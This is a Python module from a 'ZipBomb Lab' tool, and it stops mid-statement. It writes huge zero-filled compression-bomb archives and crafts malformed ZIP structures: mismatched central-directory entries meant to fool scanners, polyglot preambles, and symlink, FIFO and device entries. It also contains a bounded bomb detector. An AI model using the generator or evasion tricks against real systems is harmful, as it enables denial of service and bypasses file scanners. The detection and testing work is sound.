# ZipBomb Lab (zbomb) - made by Xv - github.com/MamadXV
"""Bomb engine: craft + make + detect + recipes.

"""

from __future__ import annotations
import sys as _sys_engine
craft = _sys_engine.modules[__name__]
from . import core as _core_engine
methods = _core_engine
sizes = _core_engine
make = _sys_engine.modules[__name__]
detect = _sys_engine.modules[__name__]
recipes = _sys_engine.modules[__name__]


# -- craft --
"""Raw ZIP byte crafting for the structural families that ``zipfile`` cannot express.

``zipfile`` writes well-formed archives, which is exactly what most recipes
want. A few known bomb techniques need bytes that ``zipfile`` will not produce:

* **Unix metadata** - symlinks, FIFOs and device nodes are encoded in the
  central directory's ``external attributes`` field (the high 16 bits are the
  Unix mode) plus ``create_system = 3``. ``zipfile`` will carry those through,
  so :func:`special_info` is enough to build the ``traversal`` family.
* **Ambiguity** - the central directory can disagree with the local file
  header, or two entries can point at the same local data. Readers resolve
  those differently, so a scanner can see something harmless while an extractor
  sees a bomb. :func:`patch_central` and :func:`central_entries` make those
  cases buildable and :func:`local_central_mismatches` /
  :func:`duplicate_offsets` make them detectable.
* **Polyglots** - a zip may carry an arbitrary preamble because readers locate
  the end-of-central-directory record by scanning backwards, so the same file
  can also look like a PDF or an HTML page. :data:`PREAMBLES` supplies
  recognisable ones.

Nothing here decompresses anything; all helpers work on bytes and are bounded
by their inputs.
"""


import struct
from dataclasses import dataclass

__all__ = [
    "S_IFREG",
    "S_IFDIR",
    "S_IFLNK",
    "S_IFIFO",
    "S_IFCHR",
    "S_IFBLK",
    "ZIP64_LIMIT",
    "CraftError",
    "unix_mode",
    "unix_attr",
    "mode_name",
    "special_info",
    "PREAMBLES",
    "CentralEntry",
    "find_eocd",
    "central_entries",
    "patch_central",
    "local_header_fields",
    "local_central_mismatches",
    "duplicate_offsets",
    "looks_like_polyglot",
    "strip_preamble",
    "CONTAINER_MAGICS",
    "sniff_containers",
]

#: Unix file-type bits (POSIX ``st_mode``).
S_IFREG = 0o100000
S_IFDIR = 0o040000
S_IFLNK = 0o120000
S_IFIFO = 0o010000
S_IFCHR = 0o020000
S_IFBLK = 0o060000

#: Largest value a classic 32-bit size field can hold.
ZIP64_LIMIT = 0xFFFFFFFE

LFH_SIG = 0x04034B50
CDFH_SIG = 0x02014B50
EOCD_SIG = 0x06054B50

#: 4 = Unix, so extractors honour the ``external_attr`` mode bits.
UNIX_CREATE_SYSTEM = 3

_LFH = struct.Struct("<IHHHHHIIIHH")
_CDFH = struct.Struct("<IHHHHHHIIIHHHHHII")
_EOCD = struct.Struct("<IHHHHIIH")

#: Recognisable preambles for the polyglot family. They are enough to satisfy
#: magic/type sniffers; a fully valid PDF would need computed xref offsets.
PREAMBLES: dict[str, bytes] = {
    "none": b"",
    "pdf": (
        b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
        b"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
        b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
        b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 72 72]>>endobj\n"
        b"trailer<</Root 1 0 R>>\n%%EOF\n"
    ),
    "html": (
        b"<!doctype html>\n<html><head><title>index</title></head>"
        b"<body><p>loading</p></body></html>\n"
    ),
    "gif": b"GIF89a\x01\x00\x01\x00\x80\x00\x00;\n",
}

#: Magic bytes for container formats a nested-bomb walker should follow.
CONTAINER_MAGICS: tuple[tuple[str, bytes], ...] = (
    ("zip", b"PK\x03\x04"),
    ("gzip", b"\x1f\x8b\x08"),
    ("xz", b"\xfd7zXZ\x00"),
    ("bzip2", b"BZh"),
    ("7z", b"7z\xbc\xaf\x27\x1c"),
    ("rar", b"Rar!\x1a\x07"),
    ("zstd", b"\x28\xb5\x2f\xfd"),
)

#: Special-file mode -> label used in flags and reports.
_MODE_LABELS = {
    S_IFLNK: "symlink",
    S_IFIFO: "FIFO",
    S_IFCHR: "character device",
    S_IFBLK: "block device",
    S_IFDIR: "directory",
}


class CraftError(ValueError):
    """Raised when a byte buffer cannot be parsed as ZIP structure."""


def unix_mode(external_attr: int) -> int:
    """Extract the high-16-bit Unix mode from a central directory attribute."""
    return (int(external_attr) >> 16) & 0xFFFF


def unix_attr(mode: int) -> int:
    """Pack a Unix mode into the ``external_attr`` field."""
    return (int(mode) & 0xFFFF) << 16


def mode_name(mode: int) -> str:
    """Human label for a Unix mode's file-type bits."""
    kind = mode & 0o170000
    return _MODE_LABELS.get(kind, "regular file")


def special_info(name: str, mode: int):
    """A :class:`zipfile.ZipInfo` carrying Unix mode metadata.

    ``zipfile`` writes ``external_attr`` verbatim, so a symlink/FIFO/device is
    just an entry whose mode says so and whose body is the link target (or
    empty). Set ``create_system`` to Unix so extractors honour the bits.
    """
    import zipfile

    info = zipfile.ZipInfo(name)
    info.create_system = UNIX_CREATE_SYSTEM
    info.external_attr = unix_attr(mode)
    return info


@dataclass(frozen=True)
class CentralEntry:
    """One parsed central directory file header."""

    name: str
    method: int
    crc: int
    compress_size: int
    file_size: int
    external_attr: int
    header_offset: int
    offset: int  # byte offset of the record itself

    @property
    def mode(self) -> int:
        return unix_mode(self.external_attr)


# -- parsing ---------------------------------------------------------------


def find_eocd(data: bytes) -> int:
    """Return the offset of the end-of-central-directory record.

    Readers scan backwards from the end, so a matching record whose comment
    length lines up with the file tail is the right one; a fallback returns the
    last signature when the tail is unusual.
    """
    signature = struct.pack("<I", EOCD_SIG)
    start = max(0, len(data) - 65557)
    index = data.rfind(signature, start)
    fallback = -1
    while index != -1:
        if fallback == -1:
            fallback = index
        if index + _EOCD.size <= len(data):
            comment_len = struct.unpack_from("<H", data, index + 20)[0]
            if index + _EOCD.size + comment_len == len(data):
                return index
        index = data.rfind(signature, start, index)
    if fallback != -1:
        return fallback
    raise CraftError("no end-of-central-directory record found")


def central_entries(data: bytes) -> list[CentralEntry]:
    """Parse every central directory file header in *data*."""
    eocd = find_eocd(data)
    total, cd_size, cd_offset = struct.unpack_from("<HII", data, eocd + 10)
    position = cd_offset
    entries: list[CentralEntry] = []
    for _ in range(total):
        if position + _CDFH.size > len(data):
            raise CraftError("central directory is truncated")
        fields = _CDFH.unpack_from(data, position)
        if fields[0] != CDFH_SIG:
            break
        name_len, extra_len, comment_len = fields[10], fields[11], fields[12]
        name = data[position + 46 : position + 46 + name_len].decode("utf-8", "replace")
        entries.append(
            CentralEntry(
                name=name,
                method=fields[4],
                crc=fields[7],
                compress_size=fields[8],
                file_size=fields[9],
                external_attr=fields[15],
                header_offset=fields[16],
                offset=position,
            )
        )
        position += _CDFH.size + name_len + extra_len + comment_len
    return entries


def patch_central(
    data: bytes,
    name: str,
    *,
    compress_size: int | None = None,
    file_size: int | None = None,
    crc: int | None = None,
    header_offset: int | None = None,
    external_attr: int | None = None,
) -> bytes:
    """Rewrite fields in the central directory entry called *name*.

    Only fixed-width fields are touched, so the buffer keeps its length and the
    ``end of central directory`` record stays valid. This is how the
    ``overlap`` family makes a reader report something the data cannot deliver.
    """
    mutable = bytearray(data)
    target = name.encode("utf-8")
    for entry in central_entries(data):
        if entry.name.encode("utf-8", "replace") != target:
            continue
        position = entry.offset
        if compress_size is not None:
            struct.pack_into("<I", mutable, position + 20, int(compress_size) & 0xFFFFFFFF)
        if file_size is not None:
            struct.pack_into("<I", mutable, position + 24, int(file_size) & 0xFFFFFFFF)
        if crc is not None:
            struct.pack_into("<I", mutable, position + 16, int(crc) & 0xFFFFFFFF)
        if external_attr is not None:
            struct.pack_into("<I", mutable, position + 38, int(external_attr) & 0xFFFFFFFF)
        if header_offset is not None:
            struct.pack_into("<I", mutable, position + 42, int(header_offset) & 0xFFFFFFFF)
        return bytes(mutable)
    raise CraftError(f"no central directory entry named {name!r}")


def local_header_fields(data: bytes, offset: int) -> tuple[str, int, int, int, int]:
    """Parse the local file header at *offset*.

    Returns ``(name, method, crc, compress_size, file_size)``. Locals may use
    data descriptors (sizes zero); callers should treat that as "unknown".
    """
    if offset < 0 or offset + _LFH.size > len(data):
        raise CraftError("local header offset is out of range")
    fields = _LFH.unpack_from(data, offset)
    if fields[0] != LFH_SIG:
        raise CraftError("not a local file header")
    name_len, extra_len = fields[9], fields[10]
    name = data[offset + 30 : offset + 30 + name_len].decode("utf-8", "replace")
    return name, fields[3], fields[6], fields[7], fields[8]


def local_central_mismatches(data: bytes) -> list[tuple[str, int, int]]:
    """Entries whose central directory size disagrees with the local header.

    Returns ``(name, local_size, central_size)`` triples. A mismatch means the
    archive is ambiguous: a scanner reading the central directory and an
    extractor reading the local header can see different bombs.
    """
    mismatches: list[tuple[str, int, int]] = []
    for entry in central_entries(data):
        try:
            _name, _method, _crc, _cs, local_size = local_header_fields(data, entry.header_offset)
        except CraftError:
            continue
        if local_size not in (0, 0xFFFFFFFF) and local_size != entry.file_size:
            mismatches.append((entry.name, local_size, entry.file_size))
    return mismatches


def duplicate_offsets(data: bytes) -> list[tuple[int, list[str]]]:
    """Local header offsets referenced by more than one central directory entry.

    Two entries sharing one payload is the overlapping-entry trick; the same
    bytes then stand in for two different files.
    """
    grouped: dict[int, list[str]] = {}
    for entry in central_entries(data):
        grouped.setdefault(entry.header_offset, []).append(entry.name)
    return [(offset, names) for offset, names in grouped.items() if len(names) > 1]


# -- polyglot --------------------------------------------------------------


def strip_preamble(data: bytes) -> bytes:
    """Return the pure zip bytes when *data* carries a leading preamble.

    Reads locate the archive through the end-of-central-directory record, so
    the recorded central-directory offset can point before the data actually
    starts. Slicing off that difference makes the raw parsers in this module
    work on polyglot files too.
    """
    try:
        eocd = find_eocd(data)
    except CraftError:
        return data
    cd_size = struct.unpack_from("<I", data, eocd + 12)[0]
    cd_offset = struct.unpack_from("<I", data, eocd + 16)[0]
    actual = eocd - cd_size
    if actual > cd_offset:
        return data[actual - cd_offset :]
    return data


def looks_like_polyglot(data: bytes) -> str | None:
    """Return the preamble name when *data* is not a zip at offset zero.

    A reader finds the zip through the trailing end-of-central-directory
    record, so leading bytes can make the file masquerade as another type.
    """
    if not data or data.startswith(CONTAINER_MAGICS[0][1]):
        return None
    for name, magic in CONTAINER_MAGICS:
        if name == "zip":
            continue
        if data.startswith(magic):
            return name
    if data[:5] == b"%PDF-":
        return "pdf"
    if data[:15].lower().startswith(b"<!doctype html") or data[:6].lower() == b"<html>":
        return "html"
    # Any other prefix that still contains a zip payload is still a polyglot.
    try:
        find_eocd(data)
    except CraftError:
        return None
    return "unknown"


def sniff_containers(blob: bytes) -> list[str]:
    """Container formats detectable from the leading bytes of *blob*."""
    found = []
    for name, magic in CONTAINER_MAGICS:
        if blob.startswith(magic):
            found.append(name)
    return found


# -- make --
"""Streaming archive writer with split parts, resume and verification.

The payload is generated on the fly - only one ``chunk_bytes`` buffer of zeros
is ever held in memory - so a multi-gigabyte payload costs the same RAM as a
small one. Writing is the operation that costs time and disk, which is why
``policy`` gates it.

Resume model: each run finishes its archive properly, including after
``Ctrl+C`` (the partial part keeps its real size and the central directory is
still written), so a later ``--resume`` can read what is already there and
continue in a new part.
"""


import math
import time
import zipfile
import zlib
from dataclasses import asdict, dataclass, field
from pathlib import Path

from .core import lzma_preset, normalize_level
from .core import MIB, format_size
from .ui import Progress, UX

__all__ = [
    "CreateResult",
    "VerifyResult",
    "DEFAULT_CHUNK",
    "SAMPLE_VERIFY_BYTES",
    "entry_name",
    "existing_entries",
    "create_archive",
    "verify_archive",
]

#: Default size of the zero buffer used while writing.
DEFAULT_CHUNK = 4 * MIB

#: How much of an entry ``sample`` verification reads back.
SAMPLE_VERIFY_BYTES = 1 * MIB

ENTRY_BASE = "zeros"


@dataclass
class CreateResult:
    """Outcome of one archive build."""

    path: Path
    target_bytes: int
    method: str
    level: int
    archive_bytes: int
    declared_bytes: int
    compressed_bytes: int
    ratio: float
    seconds: float
    entries: int
    resumed_bytes: int
    interrupted: bool = False
    warnings: list[str] = field(default_factory=list)
    recipe: str = "flat"
    layers: int = 1
    fanout: int = 1
    expanded_bytes: int = 0

    @property
    def remaining_bytes(self) -> int:
        return max(self.target_bytes - self.declared_bytes, 0)

    @property
    def fully_expanded(self) -> int:
        """Bytes written if the archive is extracted recursively.

        Equal to ``declared_bytes`` for flat archives; for nested recipes this
        is the ``fanout ** layers`` figure that makes them dangerous.
        """
        return self.expanded_bytes or self.declared_bytes

    def summary_lines(self) -> list[str]:
        from .core import format_ratio

        lines = [
            f"archive            {self.path}",
            f"archive size       {format_size(self.archive_bytes)} "
            f"({self.archive_bytes:,} bytes)",
            f"declared contents  {format_size(self.declared_bytes)} "
            f"({self.declared_bytes:,} bytes)",
        ]
        if self.fully_expanded > self.declared_bytes:
            lines.append(
                f"fully expanded     {format_size(self.fully_expanded)} "
                f"({self.recipe}, {self.layers} layers x {self.fanout}, recursively)"
            )
        lines.extend(
            [
                f"stored payload     {format_size(self.compressed_bytes)}",
                f"expansion ratio    {format_ratio(self.ratio)}",
                f"entries            {self.entries:,}",
                f"elapsed            {self.seconds:,.1f}s",
            ]
        )
        return lines

    def as_dict(self) -> dict:
        from .core import format_ratio

        data = asdict(self)
        data["path"] = str(self.path)
        data["ratio_human"] = format_ratio(self.ratio)
        data["archive_human"] = format_size(self.archive_bytes)
        data["declared_human"] = format_size(self.declared_bytes)
        data["fully_expanded_human"] = format_size(self.fully_expanded)
        return data


@dataclass
class VerifyResult:
    """Outcome of reading an archive back."""

    path: Path
    mode: str
    entries: int
    bytes_read: int
    declared_bytes: int
    ok: bool
    detail: str

    def as_dict(self) -> dict:
        data = asdict(self)
        data["path"] = str(self.path)
        return data


def entry_name(index: int, total_entries: int, base: str = ENTRY_BASE) -> str:
    """Name for the *index*-th (1 based) entry."""
    if total_entries > 1:
        return f"{base}.part{index:03d}.bin"
    return f"{base}.bin"


def existing_entries(path: Path) -> tuple[list[zipfile.ZipInfo], int]:
    """Return our entries already in *path* plus their declared total."""
    with zipfile.ZipFile(path) as archive:
        infos = [
            info
            for info in archive.infolist()
            if info.filename.startswith(ENTRY_BASE) and info.filename.endswith(".bin")
        ]
    return infos, sum(info.file_size for info in infos)


def create_archive(
    path: Path,
    target_bytes: int,
    method: str = "deflate",
    level: int | None = None,
    chunk_bytes: int = DEFAULT_CHUNK,
    split: int | None = None,
    ux: UX | None = None,
    show_progress: bool = True,
    verify: str = "sample",
    resume: bool = False,
    overwrite: bool = True,
    warnings: list[str] | None = None,
    progress=None,
) -> CreateResult:
    """Write a zero-filled archive of *target_bytes* uncompressed size."""
    from .core import METHODS

    ux = ux or UX("auto")
    path = Path(path)
    method_key = method.lower()
    method_def = METHODS.get(method_key)
    if method_def is None:
        raise ValueError(f"unknown method {method!r}")
    level = normalize_level(method_key, level)
    target_bytes = int(target_bytes)
    if target_bytes <= 0:
        raise ValueError("target size must be greater than zero")
    chunk_bytes = int(chunk_bytes)
    if chunk_bytes <= 0:
        raise ValueError("chunk size must be greater than zero")
    chunk_bytes = min(chunk_bytes, target_bytes)
    split_bytes = int(split) if split is not None else target_bytes
    if split_bytes <= 0:
        raise ValueError("split size must be greater than zero")

    path.parent.mkdir(parents=True, exist_ok=True)
    notes = list(warnings or [])

    resumed_bytes = 0
    start_index = 1
    if path.exists() and path.stat().st_size > 0:
        if not resume:
            if not overwrite:
                raise FileExistsError(f"{path} already exists")
            path.unlink()
        else:
            if not zipfile.is_zipfile(path):
                raise ValueError(
                    f"{path} is not a readable zip archive, so it cannot be "
                    f"resumed - delete it and start again"
                )
            infos, resumed_bytes = existing_entries(path)
            start_index = len(infos) + 1
            if resumed_bytes >= target_bytes:
                raise ValueError(
                    f"{path} already declares {format_size(resumed_bytes)}, which "
                    f"is at least the target of {format_size(target_bytes)}"
                )
            if not split:
                notes.append(
                    "resuming into a new part; delete the archive if you want a "
                    "single-entry result"
                )

    mode = "w" if resumed_bytes == 0 else "a"
    total_entries = 1 if split_bytes >= target_bytes else math.ceil(target_bytes / split_bytes)
    compresslevel = level if method_key in ("deflate", "bzip2") else None
    bar = progress if progress is not None else (
        Progress(target_bytes, ux, label=f"writing {method_key}") if show_progress else None
    )
    if bar is not None and resumed_bytes:
        bar.advance(resumed_bytes)

    remaining = target_bytes - resumed_bytes
    buffer = b"\0" * chunk_bytes
    index = start_index
    interrupted = False
    started = time.perf_counter()

    with lzma_preset(level) as preset_applied:
        if method_key == "lzma" and not preset_applied:
            notes.append(
                "this interpreter does not expose zipfile._get_compressor, so the "
                "LZMA preset was ignored and zipfile's default was used"
            )
        with zipfile.ZipFile(
            path,
            mode,
            compression=method_def.zip_constant,
            compresslevel=compresslevel,
            allowZip64=True,
        ) as archive:
            try:
                while remaining > 0:
                    name = entry_name(index, total_entries)
                    part_limit = min(split_bytes, remaining)
                    with archive.open(name, "w") as handle:
                        written = 0
                        while written < part_limit:
                            size = min(len(buffer), part_limit - written)
                            payload = buffer if size == len(buffer) else buffer[:size]
                            handle.write(payload)
                            written += size
                            remaining -= size
                            if bar is not None:
                                bar.advance(size)
                    index += 1
            except KeyboardInterrupt:
                interrupted = True
                notes.append(
                    "interrupted - the partial part was kept and the archive was "
                    "finalised, so --resume can continue from here"
                )
    elapsed = time.perf_counter() - started
    if bar is not None:
        bar.close()

    with zipfile.ZipFile(path) as archive:
        infos = archive.infolist()
        declared = sum(info.file_size for info in infos)
        compressed = sum(info.compress_size for info in infos)

    verify_result = verify_archive(path, verify)
    if not verify_result.ok:
        raise ValueError(f"verification failed: {verify_result.detail}")
    if verify_result.mode != "none":
        ux.detail(f"verify ({verify_result.mode}): {verify_result.detail}")

    return CreateResult(
        path=path,
        target_bytes=target_bytes,
        method=method_key,
        level=level,
        archive_bytes=path.stat().st_size,
        declared_bytes=declared,
        compressed_bytes=compressed,
        ratio=(declared / compressed) if compressed else 1.0,
        seconds=elapsed,
        entries=len(infos),
        resumed_bytes=resumed_bytes,
        interrupted=interrupted,
        warnings=notes,
    )


def verify_archive(
    path: Path,
    mode: str = "sample",
    sample_bytes: int = SAMPLE_VERIFY_BYTES,
) -> VerifyResult:
    """Read an archive back to confirm it really inflates.

    ``none``   skip verification
    ``sample`` decompress the first ``sample_bytes`` of every entry
    ``full``   stream every entry completely and check its CRC

    Reading is always bounded by the declared sizes, and nothing is ever
    written to disk.
    """

    path = Path(path)
    if mode not in ("none", "sample", "full"):
        raise ValueError("verify mode must be 'none', 'sample' or 'full'")

    with zipfile.ZipFile(path) as archive:
        infos = archive.infolist()
        declared = sum(info.file_size for info in infos)

        if mode == "none":
            return VerifyResult(path, "none", len(infos), 0, declared, True, "skipped")

        if mode == "sample":
            total = 0
            for info in infos:
                if info.file_size <= 0:
                    continue
                want = int(min(info.file_size, max(sample_bytes, 1)))
                with archive.open(info) as handle:
                    data = handle.read(want)
                if len(data) != want:
                    return VerifyResult(
                        path,
                        mode,
                        len(infos),
                        total + len(data),
                        declared,
                        False,
                        f"{info.filename} returned {len(data):,} of {want:,} bytes",
                    )
                if data.strip(b"\0"):
                    return VerifyResult(
                        path,
                        mode,
                        len(infos),
                        total + len(data),
                        declared,
                        False,
                        f"{info.filename} contains non-zero bytes",
                    )
                total += len(data)
            return VerifyResult(
                path,
                mode,
                len(infos),
                total,
                declared,
                True,
                f"sampled {format_size(total)} from {len(infos)} entries",
            )

        total = 0
        for info in infos:
            crc = 0
            with archive.open(info) as handle:
                while True:
                    data = handle.read(1 * MIB)
                    if not data:
                        break
                    crc = zlib.crc32(data, crc)
                    total += len(data)
            if crc != info.CRC:
                return VerifyResult(
                    path,
                    mode,
                    len(infos),
                    total,
                    declared,
                    False,
                    f"CRC mismatch for {info.filename}",
                )
        return VerifyResult(
            path,
            mode,
            len(infos),
            total,
            declared,
            True,
            f"streamed {format_size(total)} of zeros, all CRCs match",
        )


# -- detect --
"""Metadata-first detection of compression bombs.

Nothing in this module writes to disk, and every decompression is bounded by
an explicit byte budget, so it is safe to point at an untrusted archive:
scanning a 1 TiB bomb reads at most ``max_probe_bytes`` per entry.

Signals used, strongest first:

1. expansion ratio per entry (``file_size / compress_size``);
2. total declared size of the whole archive;
3. nested archives found inside entries (sampled in memory, depth limited);
4. an entry whose compressed size is close to the whole file size, which is
   the classic signature of a recursively nested bomb;
5. entry count, ZIP64 use and suspicious entry names.
"""


import io
import json
import zipfile
from dataclasses import asdict, dataclass, field
from pathlib import Path

# merged:   # merged-away: craft lives in this file now
from .core import ZIP64_LIMIT, format_ratio
from .core import MIB, format_size

__all__ = [
    "EntryFinding",
    "ScanReport",
    "ZipBombError",
    "DEFAULT_MAX_RATIO",
    "DEFAULT_MAX_TOTAL",
    "DEFAULT_MAX_DEPTH",
    "DEFAULT_MAX_ENTRIES",
    "DEFAULT_PROBE_BYTES",
    "ZIP_MAGICS",
    "scan_archive",
    "EXIT_CLEAN",
    "EXIT_SUSPICIOUS",
    "EXIT_ERROR",
]

#: Ratio above which an entry is reported.
DEFAULT_MAX_RATIO = 1000.0
#: Total declared size above which an archive is reported.
DEFAULT_MAX_TOTAL = 500 * MIB
#: How deep nested archives are probed.
DEFAULT_MAX_DEPTH = 3
#: Entry count above which an archive is reported.
DEFAULT_MAX_ENTRIES = 10_000
#: Bytes decompressed per entry while probing (hard budget).
DEFAULT_PROBE_BYTES = 1 * MIB
#: Entries of the same size that look like a replicated nested payload.
REPLICATE_MIN_COUNT = 4
#: Smallest replica worth reporting. Deliberately small: the canonical 42.zip
#: fans out into copies of only a few KiB each, so a high bar would miss it.
REPLICATE_MIN_BYTES = 1024
#: Entries with names longer than this in bulk read as a metadata flood.
LONG_NAME_BYTES = 100
LONG_NAME_MIN_COUNT = 16
#: Whole-file read limit for the raw-index (ambiguity/polyglot) checks.
RAW_READ_LIMIT = 256 * MIB
#: Symlink targets that loop or escape the extraction root.
LOOP_TARGETS = {".", "..", "/"}
SPECIAL_MODES = (craft.S_IFLNK, craft.S_IFIFO, craft.S_IFCHR, craft.S_IFBLK)

#: Local file header, end of central directory, central directory, data descriptor.
ZIP_MAGICS = (b"PK\x03\x04", b"PK\x05\x06", b"PK\x01\x02", b"PK\x07\x08")

EXIT_CLEAN = 0
EXIT_SUSPICIOUS = 2
EXIT_ERROR = 3


class ZipBombError(Exception):
    """Raised when an archive cannot be scanned at all."""


@dataclass
class EntryFinding:
    """One entry and why it was (or was not) flagged."""

    name: str
    file_size: int
    compress_size: int
    ratio: float
    method: int
    flags: list[str] = field(default_factory=list)
    nested_depth: int = 0
    nested_total: int = 0
    nested_fanout: int = 0
    probed_bytes: int = 0

    @property
    def suspicious(self) -> bool:
        return bool(self.flags)

    def as_dict(self) -> dict:
        data = asdict(self)
        data["ratio_human"] = format_ratio(self.ratio)
        data["file_size_human"] = format_size(self.file_size)
        data["compress_size_human"] = format_size(self.compress_size)
        return data


@dataclass
class ScanReport:
    """Verdict for one scanned archive."""

    path: str
    entry_count: int
    total_uncompressed: int
    total_compressed: int
    max_ratio: float
    max_ratio_entry: str
    zip64: bool
    findings: list[EntryFinding] = field(default_factory=list)
    reasons: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)
    families: list[str] = field(default_factory=list)
    probed_bytes: int = 0

    @property
    def suspicious(self) -> bool:
        return bool(self.reasons) or any(f.suspicious for f in self.findings)

    @property
    def exit_code(self) -> int:
        return EXIT_SUSPICIOUS if self.suspicious else EXIT_CLEAN

    def verdict(self) -> str:
        return "SUSPICIOUS" if self.suspicious else "clean"

    def as_dict(self) -> dict:
        return {
            "path": self.path,
            "verdict": self.verdict(),
            "exit_code": self.exit_code,
            "entry_count": self.entry_count,
            "total_uncompressed": self.total_uncompressed,
            "total_uncompressed_human": format_size(self.total_uncompressed),
            "total_compressed": self.total_compressed,
            "max_ratio": round(self.max_ratio, 3),
            "max_ratio_human": format_ratio(self.max_ratio),
            "max_ratio_entry": self.max_ratio_entry,
            "zip64": self.zip64,
            "reasons": list(self.reasons),
            "notes": list(self.notes),
            "families": list(self.families),
            "probed_bytes": self.probed_bytes,
            "findings": [f.as_dict() for f in self.findings],
        }

    def to_json(self) -> str:
        return json.dumps(self.as_dict(), indent=2, sort_keys=True)


MIN_RATIO_ENTRY_BYTES = 1 * MIB


def _read_link_target(archive: zipfile.ZipFile, info: zipfile.ZipInfo, limit: int = 64) -> str:
    """Read a symlink's target, staying inside a small byte budget."""
    if info.file_size <= 0 or info.file_size > 4096:
        return ""
    try:
        with archive.open(info) as handle:
            return handle.read(limit).decode("utf-8", "replace")
    except (zipfile.BadZipFile, OSError, ValueError, RuntimeError):
        return ""


def _is_loop_target(target: str) -> bool:
    """True when a symlink points at itself, an ancestor, or an absolute root."""
    if not target:
        return False
    if target in LOOP_TARGETS or target.startswith("/"):
        return True
    return ".." in target.replace("\\", "/").split("/")


def _looks_like_zip(blob: bytes) -> bool:
    """Cheap check for embedded zip structures inside an entry payload."""
    if not blob:
        return False
    if blob.startswith(ZIP_MAGICS[0]) or blob.startswith(ZIP_MAGICS[1]):
        return True
    return ZIP_MAGICS[0] in blob and ZIP_MAGICS[1] in blob


def _has_zip64_extra(info: zipfile.ZipInfo) -> bool:
    """True when an entry carries a ZIP64 extended information field."""
    extra = info.extra or b""
    offset = 0
    while offset + 4 <= len(extra):
        header_id = int.from_bytes(extra[offset : offset + 2], "little")
        size = int.from_bytes(extra[offset + 2 : offset + 4], "little")
        if header_id == 0x0001:
            return True
        offset += 4 + size
    return False


def _scan_nested(
    blob: bytes,
    depth: int,
    max_depth: int,
    budget: int,
    notes: list[str],
) -> tuple[int, int, int, int]:
    """Probe *blob* for nested archives.

    Returns ``(max_depth, declared_bytes_of_deepest, fanout, probed_bytes)``.
    The walk follows only the largest entry of each nested archive and never
    exceeds ``max_depth`` levels or ``budget`` decompressed bytes.
    """
    if depth > max_depth or budget <= 0 or not _looks_like_zip(blob):
        return 0, 0, 0, 0
    try:
        inner = zipfile.ZipFile(io.BytesIO(blob))
    except (zipfile.BadZipFile, OSError, ValueError):
        notes.append(
            "embedded zip signature found, but the nested archive is truncated "
            "inside the probe window"
        )
        return 1, 0, 0, 0

    probed = 0
    deepest = 1
    declared = 0
    fanout = 0
    with inner:
        try:
            infos = inner.infolist()
        except (zipfile.BadZipFile, OSError, ValueError):
            return 1, 0, 0, 0
        declared = sum(info.file_size for info in infos)
        fanout = len(infos)
        if depth >= max_depth:
            notes.append(f"nested depth limit of {max_depth} reached")
            return deepest, declared, fanout, probed
        for info in sorted(infos, key=lambda i: i.file_size, reverse=True)[:1]:
            want = int(min(info.file_size, budget))
            if want <= 0:
                continue
            try:
                with inner.open(info) as handle:
                    payload = handle.read(want)
            except (zipfile.BadZipFile, OSError, ValueError, RuntimeError):
                notes.append(f"could not read nested entry {info.filename!r}")
                continue
            probed += len(payload)
            deeper_depth, deeper_total, deeper_fanout, deeper_probed = _scan_nested(
                payload, depth + 1, max_depth, budget - len(payload), notes
            )
            probed += deeper_probed
            if deeper_depth:
                deepest = max(deepest, 1 + deeper_depth)
                declared = max(declared, deeper_total)
                fanout = max(fanout, deeper_fanout)
    return deepest, declared, fanout, probed


def _is_zip_slip(name: str) -> bool:
    """True when an entry name would escape the extraction directory."""
    normalised = name.replace("\\", "/")
    if normalised.startswith("/") or (len(normalised) > 1 and normalised[1] == ":"):
        return True
    return ".." in normalised.split("/")


#: How many entries may be probed in deep mode (probe budget multiplier).
PROBE_WINDOWS = 8

#: Entries smaller than this are not worth probing for nested archives.
MIN_PROBE_COMPRESSED = 64


def scan_archive(
    path: Path,
    max_ratio: float = DEFAULT_MAX_RATIO,
    max_total: int = DEFAULT_MAX_TOTAL,
    deep: bool = False,
    max_depth: int = DEFAULT_MAX_DEPTH,
    max_entries: int = DEFAULT_MAX_ENTRIES,
    probe_bytes: int = DEFAULT_PROBE_BYTES,
) -> ScanReport:
    """Scan *path* using metadata first and bounded decompression when asked.

    Raises ``ZipBombError`` when the file is missing or not a readable zip.
    """
    path = Path(path)
    if not path.exists():
        raise ZipBombError(f"{path} does not exist")
    if not path.is_file():
        raise ZipBombError(f"{path} is not a regular file")
    if not zipfile.is_zipfile(path):
        raise ZipBombError(f"{path} is not a zip archive")

    try:
        archive = zipfile.ZipFile(path)
    except (zipfile.BadZipFile, OSError) as exc:
        raise ZipBombError(f"{path} could not be opened: {exc}") from exc

    notes: list[str] = []
    findings: list[EntryFinding] = []
    archive_bytes = path.stat().st_size
    probe_budget = int(probe_bytes) * PROBE_WINDOWS
    probed_total = 0

    with archive:
        try:
            infos = archive.infolist()
        except (zipfile.BadZipFile, OSError) as exc:
            raise ZipBombError(f"{path} has an unreadable index: {exc}") from exc

        total_uncompressed = sum(info.file_size for info in infos)
        total_compressed = sum(info.compress_size for info in infos)
        max_ratio = float(max_ratio)
        max_ratio_seen = 0.0
        max_ratio_entry = ""
        zip64 = len(infos) > 65534
        special_count = 0
        long_names = 0
        stacked = False

        for info in infos:
            ratio = info.file_size / max(info.compress_size, 1)
            if ratio > max_ratio_seen:
                max_ratio_seen = ratio
                max_ratio_entry = info.filename
            if _has_zip64_extra(info) or info.file_size > ZIP64_LIMIT:
                zip64 = True

            if len(info.filename.encode("utf-8", "replace")) > LONG_NAME_BYTES:
                long_names += 1

            flags: list[str] = []
            mode = craft.unix_mode(info.external_attr) if info.create_system == 3 else 0
            kind = mode & 0o170000
            if kind in SPECIAL_MODES:
                special_count += 1
                if kind == craft.S_IFLNK:
                    target = _read_link_target(archive, info)
                    flags.append(f"symlink entry pointing at {target!r}")
                    if _is_loop_target(target):
                        flags.append(
                            "symlink loop/escape: a recursive walk of the extracted "
                            "tree never terminates"
                        )
                else:
                    flags.append(
                        f"special file entry ({craft.mode_name(mode)}): reading it "
                        f"can block forever"
                    )
            if _is_zip_slip(info.filename):
                flags.append("entry name escapes the extraction directory (zip-slip)")
            if info.file_size >= MIN_RATIO_ENTRY_BYTES and ratio > max_ratio:
                flags.append(
                    f"expansion ratio {format_ratio(ratio)} is above the "
